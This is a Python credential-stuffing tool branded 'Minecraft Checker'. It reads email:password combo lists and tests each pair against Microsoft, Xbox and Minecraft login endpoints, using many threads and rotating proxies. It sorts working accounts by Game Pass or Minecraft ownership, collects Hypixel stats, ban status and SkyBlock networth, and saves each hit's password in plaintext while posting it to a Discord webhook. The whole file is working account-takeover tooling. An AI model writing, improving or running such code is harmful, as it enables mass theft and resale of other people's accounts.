import os
import sys
import time
import json
import uuid
import socket
import threading
import requests
import configparser
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs
import warnings
import urllib3

import socks
from colorama import Fore, Style, init
from http.cookiejar import MozillaCookieJar

from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect

init(autoreset=True)

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

MICROSOFT_AUTH_URL = "https://login.live.com/oauth20_authorize.srf"
XBOX_USER_AUTH = "https://user.auth.xboxlive.com/user/authenticate"
XBOX_XSTS_AUTH = "https://xsts.auth.xboxlive.com/xsts/authorize"
MC_SERVICES_LOGIN = "https://api.minecraftservices.com/authentication/login_with_xbox"
MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"
MC_ENTITLEMENTS = "https://api.minecraftservices.com/entitlements/license"

BANNER = f"""{Fore.CYAN}
╔═══════════════════════════════════════════════════════════╗
║                    Minecraft Checker                      ║
║                          @3_1o                            ║
╚═══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""


@dataclass
class Statistics:
    checked: int = 0
    hits: int = 0
    invalid: int = 0
    two_factor: int = 0
    valid_email: int = 0
    game_pass: int = 0
    game_pass_ultimate: int = 0
    normal_minecraft: int = 0
    other_products: int = 0
    retries: int = 0
    errors: int = 0
    banned_accounts: int = 0
    unbanned_accounts: int = 0
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def increment(self, attr: str, value: int = 1):
        with self._lock:
            setattr(self, attr, getattr(self, attr) + value)

    def get_stats(self) -> Dict:
        with self._lock:
            return {
                'checked': self.checked,
                'hits': self.hits,
                'invalid': self.invalid,
                'two_factor': self.two_factor,
                'valid_email': self.valid_email,
                'game_pass': self.game_pass,
                'game_pass_ultimate': self.game_pass_ultimate,
                'normal_minecraft': self.normal_minecraft,
                'other_products': self.other_products,
                'retries': self.retries,
                'errors': self.errors,
                'banned': self.banned_accounts,
                'unbanned': self.unbanned_accounts
            }


@dataclass
class AccountInfo:
    email: str
    password: str
    username: Optional[str] = None
    uuid: Optional[str] = None
    access_token: Optional[str] = None
    account_type: Optional[str] = None
    capes: List[str] = field(default_factory=list)
    hypixel_data: Dict = field(default_factory=dict)
    banned_status: Optional[str] = None
    can_change_name: Optional[bool] = None
    last_name_change: Optional[str] = None
    optifine_cape: Optional[bool] = None
    payment_info: Dict = field(default_factory=dict)


class ConfigManager:
    
    def __init__(self, config_path: str = "config.ini"):
        self.config_path = config_path
        self.config = configparser.ConfigParser()
        self._load_or_create()

    def _load_or_create(self):
        if not os.path.exists(self.config_path):
            self._create_default()
        self.config.read(self.config_path)

    def _create_default(self):
        default = {
            'Settings': {
                'webhook': '',
                'embed': 'True',
                'max_retries': '5',
                'proxyless_ban_check': 'False',
                'banned_webhook': '',
                'unbanned_webhook': '',
                'use_different_ban_proxies': 'False',
                'webhook_message': '@everyone New Hit!\nEmail: <email>\nPassword: <password>\nUsername: <name>'
            },
        
            'Captures': {
                'hypixel_stats': 'True',
                'optifine_cape': 'True',
                'ban_check': 'True',
                'name_change_info': 'True',
                'payment_info': 'False'
            }
        }

        for section, values in default.items():
            self.config[section] = {}
            for key, value in values.items():
                self.config[section][key] = str(value)

        with open(self.config_path, 'w') as f:
            self.config.write(f)

    def get(self, section: str, key: str, fallback=None):
        return self.config.get(section, key, fallback=fallback)

    def get_bool(self, section: str, key: str, fallback=False):
        return self.config.getboolean(section, key, fallback=fallback)

    def get_int(self, section: str, key: str, fallback=0):
        return self.config.getint(section, key, fallback=fallback)


class ProxyManager:
    
    def __init__(self, proxy_type: str = None):
        self.proxies: List[Dict] = []
        self.ban_proxies: List[str] = []
        self.proxy_type = proxy_type
        self._lock = threading.Lock()

    def load_from_file(self, filepath: str = "proxies.txt"):
        """Load proxies from file"""
        if not os.path.exists(filepath):
            print(f"{Fore.YELLOW}[!] {filepath} not found, running proxyless{Style.RESET_ALL}")
            return

        with open(filepath, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]

        for proxy in lines:
            formatted = self._format_proxy(proxy)
            if formatted:
                self.proxies.append(formatted)

        print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies{Style.RESET_ALL}")

    def load_ban_proxies(self, filepath: str = "ban_proxies.txt"):
        if not os.path.exists(filepath):
            print(f"{Fore.YELLOW}[!] {filepath} not found{Style.RESET_ALL}")
            return

        with open(filepath, 'r', encoding='utf-8') as f:
            self.ban_proxies = [line.strip() for line in f if line.strip()]

        print(f"{Fore.GREEN}[+] Loaded {len(self.ban_proxies)} ban check proxies{Style.RESET_ALL}")

    def _format_proxy(self, proxy: str) -> Optional[Dict]:
        if not proxy:
            return None

        if self.proxy_type == 'http':
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        elif self.proxy_type == 'socks4':
            return {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'}
        elif self.proxy_type == 'socks5':
            return {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}
        return None

    def get_proxy(self) -> Optional[Dict]:
        if not self.proxies:
            return None
        
        with self._lock:
            import random
            return random.choice(self.proxies)

    def get_ban_proxy(self) -> Optional[str]:
        if not self.ban_proxies:
            return None
        
        with self._lock:
            import random
            return random.choice(self.ban_proxies)


class MicrosoftAuth:
    
    def __init__(self, config: ConfigManager, proxy_manager: ProxyManager, stats: Statistics):
        self.config = config
        self.proxy_manager = proxy_manager
        self.stats = stats
        self.max_retries = config.get_int('Settings', 'max_retries', 5)

    def authenticate(self, email: str, password: str) -> Optional[AccountInfo]:
        session = self._create_session()
        
        try:
            url_post, ppft_token = self._get_auth_tokens(session)
            if not url_post or not ppft_token:
                return None

            ms_token = self._microsoft_login(session, email, password, url_post, ppft_token)
            if not ms_token:
                return None

            xbox_token = self._xbox_authenticate(session, ms_token)
            if not xbox_token:
                return None

            xsts_token, uhs = self._xsts_authenticate(session, xbox_token)
            if not xsts_token or not uhs:
                return None

            mc_token = self._minecraft_authenticate(session, uhs, xsts_token)
            if not mc_token:
                return None

            account = self._get_account_info(session, email, password, mc_token, xbox_token)
            
            return account

        except Exception as e:
            self.stats.increment('errors')
            return None
        finally:
            session.close()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = False
        proxy = self.proxy_manager.get_proxy()
        if proxy:
            session.proxies.update(proxy)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        return session

    def _get_auth_tokens(self, session: requests.Session) -> Tuple[Optional[str], Optional[str]]:
        auth_url = f"{MICROSOFT_AUTH_URL}?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        
        for attempt in range(self.max_retries):
            try:
                response = session.get(auth_url, timeout=15)
                
                ppft_match = None
                for pattern in [r'value=\\\"(.+?)\\\"', r'value="(.+?)"']:
                    import re
                    ppft_match = re.search(pattern, response.text)
                    if ppft_match:
                        break
                
                if not ppft_match:
                    continue

                url_match = None
                for pattern in [r'"urlPost":"(.+?)"', r"urlPost:'(.+?)'"]:
                    url_match = re.search(pattern, response.text)
                    if url_match:
                        break

                if url_match:
                    return url_match.group(1), ppft_match.group(1)

            except Exception:
                self.stats.increment('retries')
                session.proxies = self.proxy_manager.get_proxy()
                continue

        return None, None

    def _microsoft_login(self, session: requests.Session, email: str, password: str, 
                        url_post: str, ppft_token: str) -> Optional[str]:
        data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': ppft_token
        }

        for attempt in range(self.max_retries):
            try:
                response = session.post(
                    url_post,
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    allow_redirects=True,
                    timeout=15
                )

                if '#' in response.url:
                    parsed = parse_qs(urlparse(response.url).fragment)
                    token = parsed.get('access_token', [None])[0]
                    if token:
                        return token

                if any(x in response.text for x in ['recover?mkt', 'account.live.com/identity/confirm', 
                                                     'Email/Confirm', '/Abuse?mkt=']):
                    self.stats.increment('two_factor')
                    self.stats.increment('checked')
                    print(f"{Fore.MAGENTA}[2FA] {email}{Style.RESET_ALL}")
                    return None

                if any(x in response.text.lower() for x in ['password is incorrect', 
                                                             "account doesn\\'t exist",
                                                             'sign in to your microsoft account']):
                    self.stats.increment('invalid')
                    self.stats.increment('checked')
                    return None

            except Exception:
                self.stats.increment('retries')
                session.proxies = self.proxy_manager.get_proxy()
                continue

        return None

    def _xbox_authenticate(self, session: requests.Session, ms_token: str) -> Optional[str]:
        payload = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": ms_token
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }

        try:
            response = session.post(
                XBOX_USER_AUTH,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            
            if response.status_code == 200:
                return response.json().get('Token')
        except Exception:
            self.stats.increment('retries')

        return None

    def _xsts_authenticate(self, session: requests.Session, xbox_token: str) -> Tuple[Optional[str], Optional[str]]:
        payload = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [xbox_token]
            },
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT"
        }

        try:
            response = session.post(
                XBOX_XSTS_AUTH,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                xsts_token = data.get('Token')
                uhs = data['DisplayClaims']['xui'][0]['uhs']
                return xsts_token, uhs
        except Exception:
            self.stats.increment('retries')

        return None, None

    def _minecraft_authenticate(self, session: requests.Session, uhs: str, xsts_token: str) -> Optional[str]:
        payload = {'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}

        try:
            response = session.post(
                MC_SERVICES_LOGIN,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=15
            )
            
            if response.status_code == 200:
                return response.json().get('access_token')
        except Exception:
            self.stats.increment('retries')

        return None

    def _get_account_info(self, session: requests.Session, email: str, password: str,
                         mc_token: str, xbox_token: str) -> Optional[AccountInfo]:
        try:
            entitlements = session.get(
                MC_ENTITLEMENTS,
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=15
            )

            if entitlements.status_code != 200:
                return None

            account_type = self._determine_account_type(entitlements.json())
            
            if not account_type:
                self.stats.increment('valid_email')
                return None

            profile = session.get(
                MC_PROFILE_URL,
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=15
            )

            account = AccountInfo(
                email=email,
                password=password,
                access_token=mc_token,
                account_type=account_type
            )

            if profile.status_code == 200:
                data = profile.json()
                account.username = data.get('name', 'N/A')
                account.uuid = data.get('id')
                account.capes = [cape['alias'] for cape in data.get('capes', [])]

            self.stats.increment('hits')
            self.stats.increment('checked')
            
            if 'Ultimate' in account_type:
                self.stats.increment('game_pass_ultimate')
            elif 'Game Pass' in account_type:
                self.stats.increment('game_pass')
            elif 'Normal' in account_type:
                self.stats.increment('normal_minecraft')

            return account

        except Exception:
            self.stats.increment('errors')
            return None

    def _determine_account_type(self, entitlements: Dict) -> Optional[str]:
        items = entitlements.get("items", [])
        
        has_minecraft = any(
            item.get("name") in ("game_minecraft", "product_minecraft") and
            item.get("source") in ("PURCHASE", "MC_PURCHASE")
            for item in items
        )
        
        has_game_pass = any(item.get("name") == "product_game_pass_pc" for item in items)
        has_ultimate = any(item.get("name") == "product_game_pass_ultimate" for item in items)

        if has_minecraft and has_ultimate:
            return "Minecraft + Game Pass Ultimate"
        elif has_minecraft and has_game_pass:
            return "Minecraft + Game Pass"
        elif has_minecraft:
            return "Normal Minecraft"
        elif has_ultimate:
            return "Game Pass Ultimate Only"
        elif has_game_pass:
            return "Game Pass Only"
        
        return None


class DataEnricher:
    
    def __init__(self, config: ConfigManager, proxy_manager: ProxyManager, stats: Statistics):
        self.config = config
        self.proxy_manager = proxy_manager
        self.stats = stats

    def enrich_account(self, account: AccountInfo, session: requests.Session):
        if self.config.get_bool('Captures', 'hypixel_stats'):
            self._fetch_hypixel_data(account, session)
        
        if self.config.get_bool('Captures', 'optifine_cape'):
            self._check_optifine_cape(account, session)
        
        if self.config.get_bool('Captures', 'name_change_info'):
            self._check_name_change(account, session)
        
        if self.config.get_bool('Captures', 'ban_check'):
            self._check_hypixel_ban(account, session)

    def _fetch_hypixel_data(self, account: AccountInfo, session: requests.Session):
        if not account.username or account.username == 'N/A':
            return

        try:
            proxy = self.proxy_manager.get_proxy()
            response = session.get(
                f'https://plancke.io/hypixel/player/stats/{account.username}',
                proxies=proxy,
                timeout=10,
                verify=False,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
            )

            if response.status_code == 200:
                import re
                text = response.text
                data = {}
                
                patterns = {
                    'rank': r'<meta property="og:description" content="([^"]+)"',
                    'level': r'<b>Level:</b>\s*([0-9.]+)',
                    'first_login': r'<b>First login:</b>\s*([^<]+)',
                    'last_login': r'<b>Last login:</b>\s*([^<]+)',
                }

                for key, pattern in patterns.items():
                    match = re.search(pattern, text)
                    if match:
                        data[key] = match.group(1).strip()

                bedwars_match = re.search(r'Bed Wars.*?<b>Level:</b>\s*([0-9]+)', text, re.DOTALL)
                if bedwars_match:
                    data['bedwars_stars'] = bedwars_match.group(1)

                account.hypixel_data = data

                # Get Skyblock networth using EliteBot API
                if self.config.get_bool('Captures', 'hypixel_stats') and account.uuid:
                    try:
                        # Get all profiles first
                        profiles_response = session.get(
                            f"https://api.elitebot.dev/profile/{account.uuid}",
                            proxies=proxy,
                            timeout=10,
                            verify=False
                        )
                        
                        if profiles_response.status_code == 200:
                            profiles = profiles_response.json()
                            
                            # Find the selected/main profile
                            selected_profile = None
                            for profile_id, profile_data in profiles.items():
                                if isinstance(profile_data, dict) and profile_data.get('current', False):
                                    selected_profile = profile_id
                                    break
                            
                            # If no current profile, use the first one
                            if not selected_profile and profiles:
                                selected_profile = next(iter(profiles.keys()))
                            
                            if selected_profile:
                                # Get networth for the selected profile
                                networth_response = session.get(
                                    f"https://api.elitebot.dev/profile/{account.uuid}/{account.uuid}/networth",
                                    proxies=proxy,
                                    timeout=10,
                                    verify=False
                                )
                                
                                if networth_response.status_code == 200:
                                    networth_data = networth_response.json()
                                    networth = networth_data.get('networth', 0)
                                    
                                    # Format networth
                                    if networth >= 1_000_000_000:
                                        formatted = f"{networth / 1_000_000_000:.2f}B"
                                    elif networth >= 1_000_000:
                                        formatted = f"{networth / 1_000_000:.2f}M"
                                    elif networth >= 1_000:
                                        formatted = f"{networth / 1_000:.2f}K"
                                    else:
                                        formatted = f"{networth:.2f}"
                                    
                                    account.hypixel_data['skyblock_coins'] = formatted
                    except:
                        pass

        except Exception as e:
            self.stats.increment('errors')

    def _check_optifine_cape(self, account: AccountInfo, session: requests.Session):
        if not account.username or account.username == 'N/A':
            return

        try:
            proxy = self.proxy_manager.get_proxy()
            response = session.get(
                f'http://s.optifine.net/capes/{account.username}.png',
                proxies=proxy,
                timeout=5,
                verify=False
            )
            
            account.optifine_cape = "Not found" not in response.text
        except:
            account.optifine_cape = None

    def _check_name_change(self, account: AccountInfo, session: requests.Session):
        if not account.access_token:
            return

        try:
            response = session.get(
                'https://api.minecraftservices.com/minecraft/profile/namechange',
                headers={'Authorization': f'Bearer {account.access_token}'},
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                account.can_change_name = data.get('nameChangeAllowed', False)
                
                created_at = data.get('createdAt')
                if created_at:
                    try:
                        from datetime import datetime, timezone
                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                        given_date = given_date.replace(tzinfo=timezone.utc)
                        current_date = datetime.now(timezone.utc)
                        difference = current_date - given_date
                        
                        years = difference.days // 365
                        months = (difference.days % 365) // 30
                        days = difference.days
                        
                        if years > 0:
                            account.last_name_change = f"{years}y ago"
                        elif months > 0:
                            account.last_name_change = f"{months}mo ago"
                        else:
                            account.last_name_change = f"{days}d ago"
                    except:
                        pass
        except:
            pass

    def _check_hypixel_ban(self, account: AccountInfo, session: requests.Session):
        if not account.username or not account.access_token or not account.uuid:
            return

        tries = 0
        max_ban_tries = 3
        
        while tries < max_ban_tries:
            try:
                auth_token = AuthenticationToken(
                    username=account.username,
                    access_token=account.access_token,
                    client_token=uuid.uuid4().hex
                )
                auth_token.profile = Profile(id_=account.uuid, name=account.username)

                connection = Connection(
                    "alpha.hypixel.net",
                    25565,
                    auth_token=auth_token,
                    initial_version=47,
                    allowed_versions={"1.8", 47}
                )

                ban_status = {'status': None}

                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    text = str(data)
                    
                    if "Suspicious activity" in text:
                        ban_status['status'] = "Banned - Suspicious Activity"
                    elif "temporarily banned" in text:
                        ban_status['status'] = "Temporarily Banned"
                    elif "You are permanently banned" in text:
                        ban_status['status'] = "Permanently Banned"
                    elif "The Hypixel Alpha server is currently closed!" in text:
                        ban_status['status'] = "Not Banned"
                    elif "Failed cloning your SkyBlock data" in text:
                        ban_status['status'] = "Not Banned"
                    else:
                        ban_status['status'] = ''.join(item.get("text", "") for item in data.get("extra", []))
                        if not ban_status['status']:
                            ban_status['status'] = "Unknown"

                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if ban_status['status'] is None:
                        ban_status['status'] = "Not Banned"

                proxy = self.proxy_manager.get_ban_proxy()
                if proxy:
                    try:
                        if '@' in proxy:
                            parts = proxy.split('@')
                            auth_parts = parts[0].split(':')
                            server_parts = parts[1].split(':')
                            socks.set_default_proxy(
                                socks.SOCKS5,
                                addr=server_parts[0],
                                port=int(server_parts[1]),
                                username=auth_parts[0],
                                password=auth_parts[1]
                            )
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    except:
                        pass

                try:
                    connection.connect()
                    counter = 0
                    while ban_status['status'] is None and counter < 1000:
                        time.sleep(0.01)
                        counter += 1
                    connection.disconnect()
                except:
                    pass

                # If we got a status, break the retry loop
                if ban_status['status'] is not None:
                    account.banned_status = ban_status['status']
                    
                    if ban_status['status'] and 'Banned' in ban_status['status']:
                        self.stats.increment('banned_accounts')
                    elif ban_status['status'] == 'Not Banned':
                        self.stats.increment('unbanned_accounts')
                    
                    break

            except Exception:
                pass
            
            tries += 1
        
        # If all retries failed, set as Check Failed
        if account.banned_status is None:
            account.banned_status = "Check Failed"


class AccountChecker:
    
    def __init__(self, config: ConfigManager, proxy_manager: ProxyManager, stats: Statistics):
        self.config = config
        self.proxy_manager = proxy_manager
        self.stats = stats
        self.auth = MicrosoftAuth(config, proxy_manager, stats)
        self.enricher = DataEnricher(config, proxy_manager, stats)
        
        # Create session-specific output directory
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.output_dir = os.path.join("results", f"session_{timestamp}")
        os.makedirs(self.output_dir, exist_ok=True)

    def check_account(self, combo: str):
        try:
            parts = combo.strip().split(':')
            if len(parts) < 2:
                self.stats.increment('invalid')
                self.stats.increment('checked')
                return

            email, password = parts[0], parts[1]
            
            account = self.auth.authenticate(email, password)
            
            if account:
                session = requests.Session()
                session.verify = False
                proxy = self.proxy_manager.get_proxy()
                if proxy:
                    session.proxies.update(proxy)
                
                self.enricher.enrich_account(account, session)
                session.close()
                
                self._save_hit(account)
                self._send_webhook(account)
                
                hypixel_info = ""
                if account.hypixel_data:
                    rank = account.hypixel_data.get('rank', 'None')
                    level = account.hypixel_data.get('level', 'N/A')
                    hypixel_info = f" | Hypixel: {rank} (Lvl {level})"
                
                ban_info = ""
                if account.banned_status:
                    ban_info = f" | Ban: {account.banned_status}"
                
                print(f"{Fore.GREEN}[HIT] {email} | {account.account_type}{hypixel_info}{ban_info}{Style.RESET_ALL}")
            
        except Exception as e:
            self.stats.increment('errors')
            self.stats.increment('checked')

    def _save_hit(self, account: AccountInfo):
        # All files now save to the session-specific directory
        filename = os.path.join(self.output_dir, "hits.txt")
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{account.email}:{account.password}\n")


        capture_file = os.path.join(self.output_dir, "captures.txt")
        with open(capture_file, 'a', encoding='utf-8') as f:
            f.write(f"\n{'═'*70}\n")
            f.write(f"CHECKED : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'═'*70}\n\n")

            f.write("--- BASIC ACCOUNT INFO ---\n")
            f.write(f"Email       : {account.email}\n")
            f.write(f"Password    : {account.password}\n")
            f.write(f"Username    : {account.username or 'N/A'}\n")
            f.write(f"UUID        : {account.uuid or 'N/A'}\n")
            f.write(f"Account Type: {account.account_type or 'No ownership'}\n")
            f.write(f"Capes       : {', '.join(account.capes) if account.capes else 'None'}\n\n")

            f.write("--- HYPIXEL STATS ---\n")
            hd = account.hypixel_data
            f.write(f"Hypixel Username            : {hd.get('rank', 'N/A')}\n")
            f.write(f"Network Level   : {hd.get('level', 'N/A')}\n")
            f.write(f"First Login     : {hd.get('first_login', 'N/A')}\n")
            f.write(f"Last Login      : {hd.get('last_login', 'N/A')}\n")
            f.write(f"BedWars Stars   : {hd.get('bedwars_stars', 'N/A')}\n")
            f.write(f"SkyBlock Networth: {hd.get('skyblock_coins', 'N/A')}\n\n")

            f.write(" --- EXTRA ACCOUNT INFORMATION ---\n")
            f.write(f"OptiFine Cape     : {'Yes' if account.optifine_cape else ('No' if account.optifine_cape is not None else 'N/A')}\n")
            f.write(f"Can Change Name   : {'Yes' if account.can_change_name else ('No' if account.can_change_name is not None else 'N/A')}\n")
            f.write(f"Last Name Change  : {account.last_name_change or 'N/A'}\n")
            f.write(f"Hypixel Ban Status: {account.banned_status or 'Check Failed / N/A'}\n")
            f.write(f"{'═'*70}\n")
        
        type_file = None
        if 'Ultimate' in account.account_type:
            type_file = "game_pass_ultimate.txt"
        elif 'Game Pass' in account.account_type:
            type_file = "game_pass.txt"
        elif 'Normal' in account.account_type:
            type_file = "normal_minecraft.txt"
        
        if type_file:
            with open(os.path.join(self.output_dir, type_file), 'a', encoding='utf-8') as f:
                f.write(f"{account.email}:{account.password}\n")
        
        if account.banned_status:
            if 'Banned' in account.banned_status:
                with open(os.path.join(self.output_dir, "banned.txt"), 'a', encoding='utf-8') as f:
                    f.write(f"{account.email}:{account.password}\n")
            elif account.banned_status == 'Not Banned':
                with open(os.path.join(self.output_dir, "unbanned.txt"), 'a', encoding='utf-8') as f:
                    f.write(f"{account.email}:{account.password}\n")

    def _send_webhook(self, account: AccountInfo):
        webhook_url = self.config.get('Settings', 'webhook')
        if not webhook_url:
            return

        # Send webhook asynchronously to avoid blocking
        thread = threading.Thread(target=self._send_webhook_async, args=(account, webhook_url), daemon=True)
        thread.start()

    def _send_webhook_async(self, account: AccountInfo, webhook_url: str):
        try:
            use_embed = self.config.get_bool('Settings', 'embed', True)

            placeholders = {
                '<email>': account.email,
                '<password>': account.password,
                '<n>': account.username or 'N/A',
                '<uuid>': account.uuid or 'N/A',
                '<type>': account.account_type or 'N/A',
                '<capes>': ', '.join(account.capes) if account.capes else 'None',
                '<hypixel>': account.hypixel_data.get('rank', 'N/A'),
                '<level>': account.hypixel_data.get('level', 'N/A'),
                '<firstlogin>': account.hypixel_data.get('first_login', 'N/A'),
                '<lastlogin>': account.hypixel_data.get('last_login', 'N/A'),
                '<bedwarsstars>': account.hypixel_data.get('bedwars_stars', 'N/A'),
                '<skyblockcoins>': account.hypixel_data.get('skyblock_coins', 'N/A'),
                '<ofcape>': 'Yes' if account.optifine_cape else ('No' if account.optifine_cape is not None else 'N/A'),
                '<namechange>': 'Yes' if account.can_change_name else ('No' if account.can_change_name is not None else 'N/A'),
                '<lastchanged>': account.last_name_change or 'N/A',
                '<banned>': account.banned_status or 'Unknown'
            }

            message_template = self.config.get('Settings', 'webhook_message', 
                '@everyone New Hit! | <type>\n'
                'Email: ||<email>||\nPassword: ||<password>||\n'
                'IGN: <n> | UUID: <uuid>\n'
                'Hypixel: <hypixel> (Lvl <level>) | Ban: <banned>'
            )

            content = message_template
            for ph, value in placeholders.items():
                content = content.replace(ph, str(value))

            payload = {
                "content": content if not use_embed else None,
                "username": "MC Account Checker",
                "avatar_url": "https://minecraft.net/favicon-32x32.png"
            }

            if use_embed:
                embed = {
                    "title": f"✓ Valid Minecraft Account | {placeholders['<type>']}",
                    "color": 0x00AA00,
                    "timestamp": datetime.utcnow().isoformat(),
                    "fields": [
                        {
                            "name": "📧 Basic Account Info",
                            "value": (
                                f"**Email:** ||{placeholders['<email>']}||\n"
                                f"**Password:** ||{placeholders['<password>']}||\n"
                                f"**Username:** {placeholders['<n>']}\n"
                                f"**UUID:** `{placeholders['<uuid>']}`\n"
                                f"**Type:** {placeholders['<type>']}\n"
                                f"**Capes:** {placeholders['<capes>']}"
                            ),
                            "inline": False
                        },
                        {
                            "name": "🎮 Hypixel Stats",
                            "value": (
                                f"**Hypixel Username:** {placeholders['<hypixel>']}\n"
                                f"**Level:** {placeholders['<level>']}\n"
                                f"**First Login:** {placeholders['<firstlogin>']}\n"
                                f"**Last Login:** {placeholders['<lastlogin>']}\n"
                                f"**BedWars Stars:** {placeholders['<bedwarsstars>']}\n"
                                f"**SkyBlock Networth:** {placeholders['<skyblockcoins>']}"
                            ),
                            "inline": False
                        },
                        {
                            "name": "ℹ️ Extra Account Info",
                            "value": (
                                f"**OptiFine Cape:** {placeholders['<ofcape>']}\n"
                                f"**Name Change Allowed:** {placeholders['<namechange>']}\n"
                                f"**Last Name Change:** {placeholders['<lastchanged>']}\n"
                                f"**Hypixel Ban Status:** {placeholders['<banned>']}"
                            ),
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": "Minecraft Account Checker • @3_1o"
                    }
                }

                payload["embeds"] = [embed]

            response = requests.post(webhook_url, json=payload, timeout=7)
            if response.status_code not in (200, 204):
                print(f"{Fore.YELLOW}Webhook failed: {response.status_code}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}Webhook error: {e}{Style.RESET_ALL}")


class ConsoleUI:

    def __init__(self, stats: Statistics, total: int):
        self.stats = stats
        self.total = total
        self.start_time = time.time()
        self.running = True

    def start(self):
        def update_loop():
            while self.running:
                self._update_display()
                time.sleep(1)
        
        thread = threading.Thread(target=update_loop, daemon=True)
        thread.start()

    def stop(self):
        self.running = False

    def _update_display(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        stats = self.stats.get_stats()
        elapsed = time.time() - self.start_time
        cpm = int((stats['checked'] / elapsed) * 60) if elapsed > 0 else 0

        print(BANNER)
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} Progress: {stats['checked']}/{self.total} ({(stats['checked']/self.total*100):.1f}%)")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} Speed: {cpm} CPM")
        print(f"{Fore.CYAN}├─────────────────────────────────────────────────┤{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} {Fore.GREEN}Hits:{Style.RESET_ALL} {stats['hits']}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} {Fore.RED}Invalid:{Style.RESET_ALL} {stats['invalid']}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} {Fore.MAGENTA}2FA:{Style.RESET_ALL} {stats['two_factor']}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} {Fore.YELLOW}Valid Email:{Style.RESET_ALL} {stats['valid_email']}")
        print(f"{Fore.CYAN}├─────────────────────────────────────────────────┤{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} Game Pass: {stats['game_pass']}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} GP Ultimate: {stats['game_pass_ultimate']}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL} Normal MC: {stats['normal_minecraft']}")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────┘{Style.RESET_ALL}")


def main():
    print(BANNER)
    
    config = ConfigManager()
    stats = Statistics()
    
    try:
        threads = int(input(f"{Fore.CYAN}[?] Threads (recommended: 50-100): {Style.RESET_ALL}"))
    except ValueError:
        print(f"{Fore.RED}[!] Invalid number{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}[?] Proxy Type:{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} HTTP/HTTPS")
    print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} SOCKS4")
    print(f"  {Fore.WHITE}[3]{Style.RESET_ALL} SOCKS5")
    print(f"  {Fore.WHITE}[4]{Style.RESET_ALL} Proxyless")
    
    proxy_choice = input(f"{Fore.CYAN}Choice: {Style.RESET_ALL}").strip()
    proxy_types = {'1': 'http', '2': 'socks4', '3': 'socks5', '4': None}
    proxy_type = proxy_types.get(proxy_choice)

    proxy_manager = ProxyManager(proxy_type)
    if proxy_type:
        proxy_manager.load_from_file()

    if not os.path.exists("combos.txt"):
        print(f"{Fore.RED}[!] combos.txt not found!{Style.RESET_ALL}")
        return

    with open("combos.txt", 'r', encoding='utf-8') as f:
        combos = list(set(line.strip() for line in f if line.strip()))

    print(f"{Fore.GREEN}[+] Loaded {len(combos)} combos{Style.RESET_ALL}")

    checker = AccountChecker(config, proxy_manager, stats)
    
    print(f"{Fore.CYAN}[+] Results will be saved to: {checker.output_dir}{Style.RESET_ALL}")

